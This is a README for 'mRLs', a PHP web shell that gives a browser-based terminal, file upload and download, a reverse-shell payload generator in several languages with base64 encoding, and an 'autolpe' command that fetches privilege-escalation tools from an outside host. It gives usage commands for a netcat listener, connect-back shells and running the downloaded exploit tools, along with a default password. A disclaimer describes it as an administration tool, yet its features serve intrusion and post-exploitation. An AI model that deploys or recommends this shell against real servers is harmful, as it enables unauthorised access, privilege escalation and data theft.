# mRLs - Mini PHP Shell

mRLs v1.0 Web-based shell terminal emulator with file management and reverse shell capabilities.

## Quick Start

```bash
php -S localhost:8000
# Open http://localhost:8000/mrlsfull.php
# Default password: mRLs
```

## Features Display
```
           ______________
_______ ______  __ \__  /________
__  __ `__ \_  /_/ /_  / __  ___/
_  / / / / /  _, _/_  /___(__  )
/_/ /_/ /_//_/ |_| /_____/____/

    mRLs Shell 1.0 | By m.R.L.s | mrls@tuta.io
┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
│  SERVER
│  ├─ IP Address : xxx.xxx.xxx.xxx
│  ├─ Hostname   : xxx
│  ├─ Your IP    : xxx.xxx.xxx.xxx
│  ├─ Web Server : xxx
│  └─ OS / kernel: xxx
│
│  SYSTEM
│  ├─ Full Info  : xxx
│  └─ User       : xxx
│
│  SECURITY
│  ├─ Safe Mode  : xxx
│  ├─ cURL       : xxx
│  ├─ Wget       : xxx
│  └─ Disabled Fn: xxx
│
│  DATABASES    : xxx
│
│  LANGUAGES    : xxx
└───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Type 'help' for available commands
```

## Commands

| Command | Description |
|---------|-------------|
| `cd <dir>` | Change directory |
| `ls` | List files |
| `cat <file>` | View file contents |
| `download <file>` | Download file |
| `upload <path>` | Upload file |
| `reverse <IP> [LANG] [PORT] [encode]` | Create reverse shell payload |
| `autolpe [py\|pl\|sh]` | Download & prepare LPE tools |
| `pwd`, `history`, `env` | System info |
| `help` | Show all commands |

## LPE Auto (Local Privilege Escalation)

The `autolpe` command downloads and prepares LPE tools from `https://mrls.wondtech.com/tools/lpe`

### Usage:
```bash
autolpe        # Creates autoLpe.py (Python runner)
autolpe py     # Creates autoLpe.py
autolpe pl     # Creates autoLpe.pl (Perl runner)
autolpe sh     # Creates autoLpe.sh (Bash runner)
```

### After download:
1. Setup listener: `nc -lvnp <PORT>`
2. Connect back: `reverse <YOUR_IP> <PORT>`
3. Run: `python3 autoLpe.py list` (or perl/bash variant)
4. Execute: `python3 autoLpe.py <tool_number>`

Tools are saved to `.mrls/lpe/` directory.

## Reverse Shell

Supported languages: php, perl, python, bash, ruby, nc, all

```bash
reverse xxx.xxx.xxx.xxx              # Python, port 4444
reverse xxx.xxx.xxx.xxx php          # PHP only
reverse xxx.xxx.xxx.xxx python xxxx # Port 8080
reverse xxx.xxx.xxx.xxx php encode   # Base64 encoded only
```

## Disclaimer

**This tool is intended for authorized, legitimate server administration purposes only.**

- Any use of this tool for unauthorized access, intrusion, or malicious activities is **illegal** and punishable by law.
- The developer(s) assume **no liability** for misuse, damage, or legal consequences.
- By using this tool, you confirm that you have **explicit authorization** from the server owner.
- This tool must not be used on any system without prior written consent.

**Your actions are your own responsibility.**

---

## Features

- Shell command execution
- File upload/download
- Tab completion
- Command history
- Variables & aliases
- Reverse shell payloads (PHP, Python, Perl, Ruby, Bash, Netcat)
- LPE tools auto-download and runner generation
- Encoding support for payloads

## Info Display

On connect, displays:
- Server IP & Hostname
- Web Server & OS/Kernel & Architecture
- User info (UID/GID)
- Safe Mode status
- cURL & Wget availability
- Available databases with versions
- Available languages & versions
- Disabled PHP functions
